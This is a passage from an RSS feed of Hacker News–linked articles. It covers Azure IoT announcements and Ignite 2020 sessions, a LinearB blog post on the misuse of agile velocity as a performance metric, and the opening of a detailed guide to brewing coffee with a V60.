<ul><li><strong>Azure Certified Device,&nbsp;</strong>the entry-level certification that validates that a device can connect with Azure IoT Hub and&nbsp;securely provision through the Device Provisioning Service (DPS)</li><li><strong>IoT Plug and Play,&nbsp;</strong><a href="https://nam02.safelinks.protection.outlook.com/?url=https%3A%2F%2Fazure.microsoft.com%2Fen-us%2Fblog%2Fprepare-and-certify-your-devices-for-iot-plug-and-play%2F&amp;data=02%7C01%7Cvwalker%40we-worldwide.com%7Cdc9023a766b7415d473e08d856ae444c%7C3ed60ab455674971a5341a5f0f7cc7f5%7C0%7C0%7C637354653788198257&amp;sdata=HcAMFZiKv8QqbSMtVSBk0S8lWCm313Ime%2FfqT%2Fj%2Fflc%3D&amp;reserved=0" target="_blank" rel="noopener">announced in August</a>, the certification that simplifies the process of building devices without custom device code</li><li><strong>Edge-managed certification,&nbsp;</strong>which focuses on device management standards for Azure connected devices for IoT devices running Windows,&nbsp;Linux or RTOS.&nbsp;Today,&nbsp;this program&nbsp;certification&nbsp;focuses&nbsp;on&nbsp;Edge runtime&nbsp;compatibility for module&nbsp;deployment and management.</li></ul>



<p><a href="https://aka.ms/AA9g2rj" target="_blank" rel="noopener">Learn more‚Ä¶</a></p>



<h3><span id="at_t_brings_first_azure_sphere_cellular_guardian_device_to_market"></span>AT&amp;T brings first Azure Sphere Cellular Guardian device to market<span></span></h3>



<p>With‚ÄØthe launch of‚ÄØthe first Azure Sphere cellular guardian device, AT&amp;T is enabling customers to expand connectivity and security without relying on Wi-Fi access.</p>



<p>This new product can connect a company‚Äôs various existing devices and machines directly to the customer‚Äôs cloud via a cellular network. This allows the customer to manage and monitor thousands of devices, aggregate data and identify potential problems.</p>



<p>By using the AT&amp;T cellular network, enterprise customers can connect devices in more than 200 countries across 500 carriers where AT&amp;T offers managed services to support day-to-day operations. AT&amp;T offers end-to-end professional services, and the secure cellular network extends the secure architecture of Azure Sphere.</p>



<p><a href="https://aka.ms/AA9gi0n" target="_blank" rel="noopener">Learn more‚Ä¶</a></p>



<h2><span id="azure_iot_sessions_at_ms_ignite_2020"></span>Azure IoT Sessions at MS Ignite 2020<span></span></h2>



<p>Here are a few of the great Azure IoT sessions available for viewing on the Microsoft Ignite conference website. These sessions are recorded and will be available for recording within 24 hours of their live stream.</p>



<h3><span id="azure_iot_services,_roadmap_and_vision_from_connected_assets_to_connected_environments"></span><a href="https://myignite.microsoft.com/sessions/8c90945c-eec6-43ed-b16a-3adf3c2ba37a" target="_blank" rel="noopener">Azure IoT services, roadmap and vision: from connected assets to connected environments</a><span></span></h3>



<p>Azure IoT is paving the way back to the workplace with the most comprehensive and powerful set of services and is leading the industry in simplifying IoT.&nbsp; Learn how IoT is evolving from providing insights and control of connected assets, to providing insights and control of entire connected environments. This session will delve into the Azure IoT services and our innovation roadmap across cloud and edge that enables this evolution. </p>



<p><a href="https://myignite.microsoft.com/sessions/8c90945c-eec6-43ed-b16a-3adf3c2ba37a" target="_blank" rel="noopener">Watch now‚Ä¶</a></p>



<p>Speaker:<br>Sam George ‚Äì CVP, Azure IoT, Microsoft</p>



<h3><span id="azure_iot_building_end_to_end_iot_solutions"></span><a href="https://myignite.microsoft.com/sessions/db80fb8c-81d3-4ce8-a1b1-9df6862c1861" target="_blank" rel="noopener">Azure IoT: building end to end IoT solutions</a><span></span></h3>



<p>The value in IoT comes from end to end business solutions that connect devices, provide insights and drive informed action. We‚Äôll cover two approaches to building IoT solutions on Azure, including using our IoT Reference Architecture or using IoT Central, our industry leading IoT application platform that requires zero cloud solution development skills. We‚Äôll cover how to connect an IoT Edge and an Azure Sphere device using both approaches. Come learn just how easy and powerful we‚Äôve made IoT.</p>



<p><a href="https://myignite.microsoft.com/sessions/db80fb8c-81d3-4ce8-a1b1-9df6862c1861" target="_blank" rel="noopener">Watch now‚Ä¶</a></p>



<p>Speakers:<br>Cory Newton-Smith ‚Äì Azure IoT Principal PM Manager, Microsoft<br>Pamela Cortez ‚Äì Azure IoT Senior PM, Microsoft</p>



<h3><span id="ask_the_expert_azure_iot_from_connected_assets_to_connected_environments_with_iot_plug_and_play"></span><a href="https://myignite.microsoft.com/sessions/802e3a27-a3fb-4212-ae7c-c570ff3a3469" target="_blank" rel="noopener">Ask the Expert: Azure IoT: From connected assets to connected environments with IoT Plug and Play</a><span></span></h3>



<p>Azure IoT is paving the way back to the workplace with the most comprehensive and powerful set of services and is leading the industry in simplifying IoT. Join this Ask the Experts to ask all your questions relating to how you can connect IoT devices to the cloud seamlessly with Plug and Play.</p>



<p><a href="https://myignite.microsoft.com/sessions/802e3a27-a3fb-4212-ae7c-c570ff3a3469" target="_blank" rel="noopener">Watch now‚Ä¶</a></p>



<p>Speaker:<br>Sam George ‚Äì CVP, Azure IoT, Microsoft</p>



<h3><span id="gathering_data_from_the_world"></span><a href="https://myignite.microsoft.com/sessions/ed1b23a6-cd0f-44fd-9cb8-afe1cd065bbc" target="_blank" rel="noopener">Gathering data from the world</a><span></span></h3>



<p>Internet of Things (IoT) is the common term used for small devices designed to provide constant streams of information about what‚Äôs going on around it. IoT devices can count actions, measure the weather, or track location. All the information being gathered needs to be stored somewhere and eventually read. Let‚Äôs talk about some of the options available to you, and how you can begin to see what‚Äôs going on with your devices.</p>



<p><a href="https://myignite.microsoft.com/sessions/ed1b23a6-cd0f-44fd-9cb8-afe1cd065bbc" target="_blank" rel="noopener">Watch now‚Ä¶</a></p>



<p>Speaker:<br>Jim Bennett ‚Äì Senior Cloud Advocate, Microsoft</p>



<h3><span id="azure_ai_and_iot_to_support_smart_office_reopening_with_rxr_realty"></span><a href="https://myignite.microsoft.com/sessions/b52ff2cb-28bb-4320-a310-81f08cf14d49" target="_blank" rel="noopener">Azure AI and IoT to support smart office reopening with RXR Realty</a><span></span></h3>



<p>Hand-on deep dive of RXR Realty‚Äôs pioneering work to make it safer for people to return back to the workplace amid Covid-19 in New York.&nbsp; Includes demonstration and explanation of how they are leveraging Azure AI and IoT for automated health checks, air quality control, social distancing, mask compliance and much more. This is an Ignite exclusive show from Microsoft Mechanics.</p>



<p><a href="https://myignite.microsoft.com/sessions/b52ff2cb-28bb-4320-a310-81f08cf14d49" target="_blank" rel="noopener">Watch now‚Ä¶</a></p>



<p>Speakers:<br>Jeremy Chapman ‚Äì Directory, Microsoft<br>Cory Clarke ‚Äì VP Product Management, RXR Realty</p>



<h3><span id="learn_how_insanely_easy_vision_ai_can_enable_real_time_insights_for_manufacturing"></span><a href="https://myignite.microsoft.com/sessions/3fc1dd73-1979-4631-a536-8f693e988dfd" target="_blank" rel="noopener">Learn how insanely easy Vision AI can enable real time insights for Manufacturing</a><span></span></h3>



<p>Intelligent Industry Solution Series:&nbsp;Integration of cameras into factory floors, warehouses and retail environment can bring immediate and actionable insights. The new Factory AI tool makes the integration of vision analytics easy and seamless.&nbsp; With a few basic inputs, any factory floor or business can enable real time insights across a variety of use cases.&nbsp;Hear from Intel and Microsoft experts on the value of intelligent vision and how to get started.</p>



<p><a href="https://myignite.microsoft.com/sessions/3fc1dd73-1979-4631-a536-8f693e988dfd" target="_blank" rel="noopener">Watch now‚Ä¶</a></p>



<p>Speakers:<br>David Armour ‚Äì Principal Program Manager, Microsoft<br>Philip Van De Mortel ‚Äì Edge Sales Manager, Intel</p>



<h3><span id="remote_patient_monitoring_sharing_a_blueprint_to_enhance_patient_care_and_safety"></span><a href="https://myignite.microsoft.com/sessions/bb380ea2-38ea-481f-9030-0c2fb5e978bb" target="_blank" rel="noopener">Remote Patient Monitoring: Sharing a blueprint to enhance patient care and safety</a><span></span></h3>



<p>Intelligent Industry Solution Series: Enhancing patient care starts with comprehensive information and personalized treatment. Combined with increased safety measures, the healthcare industry has fast tracked telehealth solutions. One practice is Remote Patient Monitoring, which reduces in-person visits, boosts patient convenience and provider efficiency. In this session, we will look at Telehealth trends, and share a remote patient monitoring blueprint enabled by Microsoft and Intel.</p>



<p><a href="https://myignite.microsoft.com/sessions/bb380ea2-38ea-481f-9030-0c2fb5e978bb" target="_blank" rel="noopener">Watch now‚Ä¶</a></p>



<p>Speakers:<br>Anne Barker ‚Äì Enterprise Account Executive, Intel<br>Michela Sainato ‚Äì Program Manager II, Microsoft</p>
<br>
						
											
						
					
					<h3>Article Author</h3>
					<div id="author-info">
						<p><img alt="" src="https://secure.gravatar.com/avatar/d565ce4d3fdf8007e1d707362cca9465?s=128&amp;d=identicon&amp;r=g" srcset="https://secure.gravatar.com/avatar/d565ce4d3fdf8007e1d707362cca9465?s=256&amp;d=identicon&amp;r=g 2x" height="128" width="128" loading="lazy" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">																						<img id="author-img-mvp" src="https://build5nines.com/wp-content/uploads/2019/08/mvp_logo_horizontal_preferred_cyan300_rgb_300ppi_163x65.png" alt="Microsoft MVP">
													</p>
						
						<p id="author-desc">Chris is the <strong>Founder of Build5Nines.com</strong> and a <strong>Microsoft MVP</strong> in Azure &amp; IoT with 20 years of experience designing and building Cloud &amp; Enterprise systems. He is also a <strong>Microsoft Certified: Azure Solutions Architect</strong>, developer, <strong>Microsoft Certified Trainer</strong> (MCT), and Cloud Advocate. He has a passion for technology and sharing what he learns with others to help enable them to learn faster and be more productive.</p>
						
					</div>
					
											
										</div></div>]]>
            </description>
            <link>https://build5nines.com/top-azure-iot-announcements-and-sessions-from-microsoft-ignite-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24574797</guid>
            <pubDate>Thu, 24 Sep 2020 02:52:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why agile velocity is the most dangerous metric]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24574765">thread link</a>) | @necco908
<br/>
September 23, 2020 | https://linearb.io/blog/why-agile-velocity-is-the-most-dangerous-metric-for-software-development-teams/ | <a href="https://web.archive.org/web/*/https://linearb.io/blog/why-agile-velocity-is-the-most-dangerous-metric-for-software-development-teams/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="670d84f7" data-element_type="widget" data-widget_type="theme-post-content.default">
				<div>
			
<figure><img src="https://linearb.io/wp-content/uploads/2020/05/TLDR-4-1024x482.png" alt="Agile velocity is useful for sprint planning, but it is often misused as a metric." srcset="https://linearb.io/wp-content/uploads/2020/05/TLDR-4-1024x482.png 1024w, https://linearb.io/wp-content/uploads/2020/05/TLDR-4-300x141.png 300w, https://linearb.io/wp-content/uploads/2020/05/TLDR-4-768x361.png 768w, https://linearb.io/wp-content/uploads/2020/05/TLDR-4-1536x723.png 1536w, https://linearb.io/wp-content/uploads/2020/05/TLDR-4.png 1700w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Agile Velocity is arguably the most popular software development metric in the world. It‚Äôs a very powerful metric when used for individual team sprint capacity planning. And there are two things we know about power‚Ä¶ it comes with great responsibility and it corrupts.&nbsp;</p>



<p>When agile velocity is used for anything other than individual team sprint capacity planning, very bad things can occur. In fact, when misused, Agile Velocity is the most dangerous metric for software development organizations. Unfortunately, every day Velocity is abused by executives, engineering leaders, product leaders, and even developers.&nbsp;</p>



<hr>



<blockquote><p><strong>Already familiar with the dangers of using agile velocity? </strong></p><p><strong><a rel="noreferrer noopener" href="https://linearb.io/12-metrics-dev-leader/" target="_blank">Click here to see 17 alternative metrics for team-focused software development leaders</a></strong></p></blockquote>



<hr>







<h3><strong>What is Agile Velocity?</strong></h3>



<p>Agile Velocity measures the amount of work a single team completes during a software development iteration or sprint. It represents the amount of story points completed over time and can be visualized as the slope in a classic burndown chart.</p>



<figure><picture>
<source type="image/webp" srcset="https://linearb.io/wp-content/uploads/2020/05/Burndown-Velocity.png.webp">
<img src="https://linearb.io/wp-content/uploads/2020/05/Burndown-Velocity.png" alt="Agile velocity is the slope of a burndown chart">
</picture>
</figure>



<h3><strong>What are Story Points?</strong></h3>



<p>Story Points are a unit of measure for expressing an estimate of the overall effort that will be required to fully implement a product backlog item or any other piece of work. Story Points are a subjective measure decided and agreed upon by an individual software development team or organization.&nbsp;</p>







<h3><strong>My personal history with Story Points &amp; Agile Velocity</strong></h3>



<p>When I was promoted into my first team lead role, like most new managers (in any function), I was in over my head. But I was determined to do a great job. I looked for every opportunity to help my team improve. Data. Metrics. Process. Culture. <a href="https://linearb.io/blog/how-to-introduce-data-driven-culture-to-your-dev-team/" target="_blank" rel="noreferrer noopener">I was hungry for all of it.&nbsp;</a></p>



<p>I remember thinking that, compared to other departments like sales, marketing, and technical support, there didn‚Äôt seem to be a lot of established metrics engineering leaders used to measure team-based performance and improvement. Which is ironic because we measure so many things ‚Äì page load performance, latency, code performance, unit test coverage, etc.&nbsp;</p>



<p>Then I found velocity. I was pretty excited. Of course, I had heard of it but I never did a deep dive. We used Jira and story points but I was never trained on velocity and it was not part of our formal process to measure story points across multiple sprints.&nbsp;</p>



<p>We started using it for capacity planning. It worked! You get what you measure, right? We started measuring velocity and the focus on it allowed us to get progressively more accurate in our sprint planning.&nbsp;</p>



<p>I was promoted to lead more teams. At some point in a management meeting, I asked all of our managers ‚ÄúShould we start reviewing velocity every week in this meeting?‚Äù. And I was actually ready to go further‚Ä¶ scrum of scrum, all-hands meetings, etc.&nbsp;</p>



<p>I‚Äôll never forget what happened‚Ä¶ <a href="https://www.linkedin.com/in/timothyrwall/" target="_blank" rel="noreferrer noopener">Tim Wall</a>, a vet on our team who I really respected, gave me the following advice: ‚ÄúNever use velocity to measure performance and never share velocity outside of individual teams.‚Äù&nbsp;</p>



<p>Thankfully, I listened to Tim. Because since then I‚Äôve heard nothing but horror stories from other engineering leaders who tried to use agile velocity for more than what it was originally intended for.&nbsp;</p>







<h3><strong>Dodging the Dangers</strong></h3>



<div><figure><picture>
<source type="image/webp" srcset="https://linearb.io/wp-content/uploads/2020/05/sidestep.jpg.webp">
<img src="https://linearb.io/wp-content/uploads/2020/05/sidestep.jpg" alt="Dodge the dangers of agile velocity" width="219" height="180">
</picture>
</figure></div>



<p>There are three main types of abuses I‚Äôve seen of Agile Velocity. Consider this a hero‚Äôs guide to help the software development community stay safe, avoid traps, and, most importantly, to use Agile Velocity for good not evil.&nbsp;</p>







<h4><strong>1) Agile Velocity abused by Dev Leaders as a team comparison metric</strong></h4>



<p>I narrowly escaped making this mistake. Some engineering leaders I know weren‚Äôt so lucky.&nbsp;</p>



<p>Here‚Äôs the scenario‚Ä¶ Agile scrum is being used by all of your teams. Velocity is being tracked on an iteration by iteration basis. You have a gut intuition that some of your teams are ‚Äúperforming better‚Äù and some of your teams are ‚Äúperforming worse‚Äù. You get an itch to see which teams are completing the most story points per iteration and which teams are completing the least story points per iteration. You‚Äôre just curious. Then you start thinking about it in terms of who has the ‚Äúbest‚Äù velocity? Maybe you even show and compare velocity in your management meeting or scrum of scrums.&nbsp;</p>



<figure><img src="https://lh3.googleusercontent.com/zmq1Ty58gfjHCGnYVG1p-ZPGvktzrADWy0d13Nr8etzoR12yZvzUE36H_HsHGrSsqNFDrzGWH1f9ZDEz-RSPIx8J1CaeKd_ePxNyRRsXOGigzLzcDFeft43B-2pHbJ2McYC-VC3w" alt="Agile velocity: Danger!" width="375" height="392"></figure>



<h5><strong>What can go wrong</strong></h5>



<p>Danger, Will Robinson! We have to be very, very careful here.&nbsp;</p>



<ul><li>Story point weights are subjective to each individual team<br></li><li>Therefore story point weights are easy to manipulate<br></li><li>Therefore developers have an incentive to inflate their points<br></li><li>Therefore individual teams and developers can easily game the system<br></li><li>If some teams are inflating their story points, other developers will figure this out<br></li><li>From here you are only a stone‚Äôs throw away from broken trust, frustration and culture damage&nbsp;</li></ul>



<p>Bad intentions aren‚Äôt even required for this to happen. It‚Äôs natural human behavior.</p>



<p>So, like Tim told me, Agile Velocity is sacred and should be used within individual teams only. Period.&nbsp;</p>







<h5><strong>Tips to navigate this situation:</strong></h5>



<p>There‚Äôs nothing wrong with looking at comparative performance data. That‚Äôs your job. Without benchmarks, you won‚Äôt be able to invest your time helping your people and teams that need it most. Since you shouldn‚Äôt use velocity, what metrics should you use? <a href="https://linearb.io/blog/align-engineering-metrics-to-your-business-kpis/" target="_blank" rel="noreferrer noopener">It depends on the business outcome you‚Äôre trying to achieve</a>:</p>



<ul><li>If speed to value is your main goal, consider <a href="https://linearb.io/cycle-time/" target="_blank" rel="noreferrer noopener">Cycle Time</a>.</li><li>If predictability is your main goal, look at Iteration Churn.&nbsp;</li><li>If quality is your priority, Change Failure Rate and Mean Time to Restore are good.</li></ul>







<p>A related question to ask yourself is what kind of culture do I want to create? <a href="https://linearb.io/blog/our-dev-culture-is-based-on-bushido-samurai-code-my-interview-with-the-vp-of-engineering-at-gigsmart/" target="_blank" rel="noreferrer noopener">One VP of Engineering I interviewed recently</a> talked about how measuring the wrong things can backfire and hurt culture. <a href="https://linearb.io/coffee-talk/" target="_blank" rel="noreferrer noopener">Chris Downard from GigSmart</a> says</p>



<figure><blockquote><p><em>‚ÄúIf you stack rank individual devs you create anxiety.</em></p><cite>Chris Downard, VP of Engineering, Gigsmart</cite></blockquote></figure>



<p>One of the things I don‚Äôt like about getting individual statistics, like the number of commits you push as an individual developer, is that you‚Äôre incentivizing the number of commits they push. Not necessarily the quality. Or not necessarily tied to the business objective for delivery.&nbsp;</p>



<p><em>I don‚Äôt care how many commits they make. I care about the work the team gets done. For example, if a developer starts pairing [pair programming] a bunch that should not affect how we view them as long as they keep delivering value.‚Äù</em></p>



<p>He‚Äôs not the only software development leader I‚Äôve met who feels this way. Kara Minotti Becker, a respected agile consultant, told me recently</p>



<p><em>‚ÄúMembers of software development teams, including engineers, are often scared of metrics‚Ä¶ who they‚Äôre going to be exposed to.‚Äù</em></p>



<p>I‚Äôve seen this too. If you want to create an environment where it‚Äôs all about the team, consider throwing out metrics like individual code changes and commits, and just measure team-based metrics.&nbsp;</p>







<h3>2) <strong>Agile Velocity abused by Executives as a performance metric</strong></h3>



<p>It‚Äôs no secret‚Ä¶ executives love data. Especially performance related metrics.</p>



<p>One of the biggest issues that we face as software development leaders is the lack of standardized metrics describing the health and performance of our teams. Unlike all other major departments (sales, marketing, finance), we as a community lack the basics when it comes to data-driven team performance.&nbsp;</p>



<p>Sales has revenue and pipeline and sales cycle length&nbsp;</p>



<p>Marketing has MQLs and SQLs and cost of customer acquisition&nbsp;</p>



<p>HR has positive and negative employee engagement and retention rates&nbsp;</p>



<p>CEOs and business leaders get these metrics. They know what good and bad looks like. They know the leading indicators for success. They know what levers they can pull when those department leaders need help.&nbsp;</p>



<p>Engineering is often reduced to, <a href="https://linearb.io/blog/two-data-points-the-vp-of-engineering-should-show-the-ceo-every-week/" target="_blank" rel="noreferrer noopener">‚Äúare we on track to deliver XYZ feature by the deadline?‚Äù</a></p>



<p>Their intentions are good and they want to understand, but most CEOs don‚Äôt have an engineering background and therefore they don‚Äôt have tools they need to understand engineering in the same way.&nbsp;</p>



<p>Then all of sudden your CEO catches wind that there is a metric called Velocity that your agile software development teams are tracking.&nbsp;</p>



<p>You say‚Ä¶ <em>‚ÄúEach team uses it to estimate how much work they can get done in a sprint.‚Äù</em></p>



<p>They hear‚Ä¶ ‚ÄúWe can use it to measure dev org output over time and rank team performance.‚Äù&nbsp;</p>



<p>They say‚Ä¶&nbsp; ‚ÄúLet‚Äôs start presenting velocity in every executive meeting and at every all-hands!‚Äù</p>



<p>What you should think‚Ä¶ ‚ÄúIt‚Äôs a trap!‚Äù&nbsp;</p>



<figure><picture>
<source type="image/webp" srcset="https://linearb.io/wp-content/uploads/2020/05/Its-a-trap.jpg.webp">
<img src="https://linearb.io/wp-content/uploads/2020/05/Its-a-trap.jpg" alt="Using agile velocity as a metric is a trap">
</picture>
</figure>



<h4><strong>What can go wrong</strong></h4>



<p>At this point in the conversation, our spidey senses should be going crazy. Velocity at the executive table? Do not proceed.&nbsp;</p>



<h5><strong>Tips to navigate this situation</strong></h5>



<p>This is our time to gracefully push back.&nbsp;</p>



<ul><li>Ask questions to understand what exactly your executive team is looking for. Is it team performance data? Are they worried about deadline predictability? Are they wondering about the impact of the new hires they invested in?<br></li><li>Start with yes. ‚ÄúWe can absolutely be data-driven.‚Äù<br>(I had a boss that told me ‚Äústart with yes‚Äù, then get to the outcome you want. That concept has served me well over the years ‚Äì especially with CEOs üôÇ )<br></li><li>You know that it will damage culture and encourage sandbagging. But consider keeping all of that to yourself and just explain why Agile Velocity is not accurate when used for anything other than individual team sprint capacity planning. A<br></li><li>Come with an alternative. <a rel="noreferrer noopener" href="https://linearb.io/cycle-time/" target="_blank">Cycle time</a> is a great one because execs already understand sales cycle time. Software development cycle time is the equivalent for engineering teams.&nbsp;</li></ul>







<h3><strong>3) Agile Velocity as a false predictor of project delivery date</strong></h3>



<p>We‚Äôve gone through two of the basic traps. Don‚Äôt use velocity as a performance metric at the executive table and don‚Äôt use velocity as a team comparison metric.&nbsp;</p>



<p>Now things get more interesting‚Ä¶&nbsp;</p>



<p>The scene looks like this: A project manager wants to estimate when a project is going to be delivered. ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://linearb.io/blog/why-agile-velocity-is-the-most-dangerous-metric-for-software-development-teams/">https://linearb.io/blog/why-agile-velocity-is-the-most-dangerous-metric-for-software-development-teams/</a></em></p>]]>
            </description>
            <link>https://linearb.io/blog/why-agile-velocity-is-the-most-dangerous-metric-for-software-development-teams/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24574765</guid>
            <pubDate>Thu, 24 Sep 2020 02:44:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Brew Better Coffee with a V60]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24574431">thread link</a>) | @ValentineC
<br/>
September 23, 2020 | https://coffeeadastra.com/2018/11/30/brewing-better-coffee/ | <a href="https://web.archive.org/web/*/https://coffeeadastra.com/2018/11/30/brewing-better-coffee/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<h2><span><b><i>Table of Contents</i></b></span></h2>
<ol>
<li>
<ol>
<li><span>Introduction</span></li>
<li><span>Percolation and Immersion</span></li>
<li>Why use a V60 ?</li>
<li>The Brew Variables
<ol>
<li><span>Coffee to Water Ratio</span></li>
<li><span>Coffee Beans Quality and Roast Profile</span></li>
<li><span>Grind Size and Uniformity</span></li>
<li><span>Coffee Freshness</span></li>
<li><span>Filter quality</span></li>
<li><span>Brew temperature</span></li>
<li><span> Water Agitation</span></li>
<li><span>Uniformity of Extraction and Repeatability</span></li>
<li><span>Water quality</span></li>
<li>Contact Time</li>
</ol>
</li>
<li><span>Determining Grind Size</span></li>
<li><span>Practicing the Rao Spin</span></li>
<li><span>How To Actually Make a Better V60</span>
<ol>
<li>The Gear I Use</li>
<li>The Water I Recommend</li>
<li>A V60 Pour Over Workflow</li>
</ol>
</li>
<li>References</li>
</ol>
</li>
</ol>
<h2><span><b><i>1. Introduction</i></b></span></h2>
<p><span>I‚Äôve been interested in specialty coffee for a few years now, and never went to a telescope run without my V60, manual grinder and some fresh beans. I had not actually read that much about the details of how to brew a great cup of coffee; rather, I just bought some good beans and read some reviews for the most useful and easily transportable gear to brew coffee when traveling. A few months ago, I decided to get a little deeper into this, and to read as much as I could on the subject. This all started because I was regularly buying fresh, great tasting beans from the Saint-Henri coffee shop in Montreal, and I really wasn‚Äôt satisfied about my brews, especially when I compared them with what the Saint-Henri staff brewed with the same coffee.</span></p>
<p><span>This turned out to be a massive rabbit hole, but I actually love it when it happens. During the past few months, I changed a lot of things about my brew method and equipment. Having great coffee beans is definitely required to brew a great coffee, but I learned there are countless obstacles that can ruin your cup pretty drastically, regardless of your bean‚Äôs quality. I was quite surprised how hard some of this information was to find on the web, and in the past months I have done a lot of experiments and huge mistakes that took me a while to figure out. So, I decided that I‚Äôll write a blog post to distill some of this information, and to guide any interested readers through the steps to improve their coffee cups, either at home or when traveling. I might write a few more posts like this in the future when I discover better methods, or when I familiarize myself with new tools and recipes.</span></p>
<p><span>Another thing that really frustrated me when researching this topic is the amount of pseudoscience one encounters on the subject of specialty coffee. Surprisingly enough, some of the main culprits include previous world champion baristas (hmmmmmm <a href="https://www.youtube.com/watch?v=wmCW8xSWGZY"><span>Kasuya</span></a>, are you using these magical self-transmuting beans again ?)</span></p>
<p><span>For those who don‚Äôt know me, this blog post is not intended to be a quick-and-approximate guide of how to make a V60 ‚Äì there are plenty of videos already doing that on the web. Rather, it‚Äôs intended for the more geeky-minded people that are interested in all the technical details. I‚Äôm fully aware that half of the things I‚Äôll discuss here will only produce an increase in cup quality of a few % (e.g., ‚Äúnow let‚Äôs sift our coffee grounds for 5 minutes and remove 5 g of the grinds with a 350&nbsp;<i>Œº</i>m sieve to achieve a tighter particle size distribution‚Äù), but there are some other aspects of brewing that, despite sounding insane, can have a profound impact on your cup quality (e.g., ‚Äúoh no, this tap water has 200 ppm alkalinity‚Äù).</span></p>
<p><span>If you are inclined to think that bringing a scientific mindset and sophisticated tools to improve a coffee is not justified, here‚Äôs something to consider ‚Äì most other products that we consume went through much more technical assessment, and we understand more of the science behind them (e.g., wine, beer, cheese, scotch). Somehow, coffee almost never gets this treatment. I‚Äôm not sure why, but maybe its being used for caffeine rather than taste might have something to do with it. But that‚Äôs a whole other topic about which I know very little.</span></p>
<p><span>For now I‚Äôll focus on the V60 method, because it‚Äôs cheaper, simpler and easier to carry around for travel. For those not familiar with the V60, it‚Äôs basically minimalism for baristas: a conic shaped object, often made of plastic or ceramic, that you put on top of your coffee mug (or other fancy container) to manually brew coffee. It also serves as a convincing argument when a TSA agent asks you what the hell is all that other equipment making up half of your luggage.</span></p>
<h2><span><b><i>2. Percolation and Immersion</i></b></span></h2>
<p><span>Because you constantly pour fresh water over coffee with the V60 method, it‚Äôs part of the many methods under the umbrella of <i>percolation</i> brewing. Other examples include batch brewers and moka pots. This is in contrast to <i>immersion</i> brewing, where coffee grounds remain in contact with the same water during the totality of the brew process. Some examples of immersion brews include a french press or a siphon brewer. The main difference between percolation and immersion arise from the fact that fresh water is a better solvent than coffee. In an immersion brew, the speed of extraction decreases as the coffee gets more concentrated, but in a percolation brew, the water in contact with the coffee grounds is almost fresh, so the extraction is always very efficient. You can achieve similar results with either types of brews, but how you navigate across brewing recipes can be very different, and each method has its particularities.</span></p>
<h2><span><b><i>3. Why use a V60 ?</i></b></span></h2>
<p><span>Some people might ask ‚ÄúWhat‚Äôs the point of using a V60 if I have a great batch brewer at home ?‚Äù This is a fair question; I think it‚Äôs possible to achieve great results with a clean and high-quality batch brewing machine (some coffee experts like Scott Rao <a href="https://www.scottrao.com/blog/batch-brew-basics-part-1-the-setup?rq=batch"><span>also do</span></a>), but personally I haven‚Äôt often tasted great cups of coffee made with batch brewers.</span></p>
<p><span>In theory, I don‚Äôt see why an automated household brewer couldn‚Äôt mop the floor with cups made from manual V60s, but in practice they are often cheap, and never made with the question ‚Äúhow to produce a great extraction ?‚Äù in mind, but rather to simply dump water on coffee with the cheapest materials. They are often made of plastic, which I find can impart a bad taste to the cup (this probably depends on the type of plastic). It‚Äôs also easy to forget to clean them from time to time, which will eventually make your coffee disgusting (just try to smell the basket of a batch brewer in a hotel room if you want an idea ‚Äì but really, don‚Äôt). They also often come with a relatively large container for water which will go stale if you don‚Äôt use it intensely, and that will also result in really bad coffee.&nbsp;Some of these machines also come with a heating element under the coffee jar, which is a great way to burn your coffee and make it even worse.</span></p>
<p><span>At most specialty coffee shops, they have decent batch brewers and they seem to clean them often. The problem I most often encounter in that scenario is how long the cup of coffee stayed in the hermetic jar before the staff served it. If it‚Äôs fresher than about half an hour, the resulting cup can be super good, but wait much longer than that and it will start to gradually taste like each subsequent level of hell. It will never reach the final level of hell however, this one is only accessible to the worst lattes.</span></p>


<div><figure><img loading="lazy" data-attachment-id="590" data-permalink="https://coffeeadastra.com/img_8424/" data-orig-file="https://coffeeadastra.files.wordpress.com/2018/11/img_8424.png" data-orig-size="3024,4032" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_8424" data-image-description="" data-medium-file="https://coffeeadastra.files.wordpress.com/2018/11/img_8424.png?w=225" data-large-file="https://coffeeadastra.files.wordpress.com/2018/11/img_8424.png?w=750" src="https://jgagneastro.files.wordpress.com/2018/11/img_8424.png?w=768" alt="" width="301" height="401" srcset="https://jgagneastro.files.wordpress.com/2018/11/img_8424.png?w=301 301w, https://jgagneastro.files.wordpress.com/2018/11/img_8424.png?w=602 602w, https://jgagneastro.files.wordpress.com/2018/11/img_8424.png?w=113 113w, https://jgagneastro.files.wordpress.com/2018/11/img_8424.png?w=225 225w" sizes="(max-width: 301px) 100vw, 301px"><figcaption>Uh oh (I won‚Äôt say where I got this latte). It tasted as good as the latte art looks.</figcaption></figure></div>


<p><span>A V60 offers the advantage of potentially producing a great cup (if you do<span>&nbsp; </span>things correctly) with a ~20$ piece of equipment. Plus, it‚Äôs really easy to clean and carry for travel, and it‚Äôs more flexible than a cheap batch brewer if you want to experiment with your brew recipes.</span></p>
<p><span>In my view, there are three challenges when using a V60: (1) being consistent from one brew to the next, (2) not losing a lot of heat from your brew water, and (3) having several of your brew variables intertwined (we‚Äôll come back to what these variables are), leaving you with less control over individual variables.</span></p>
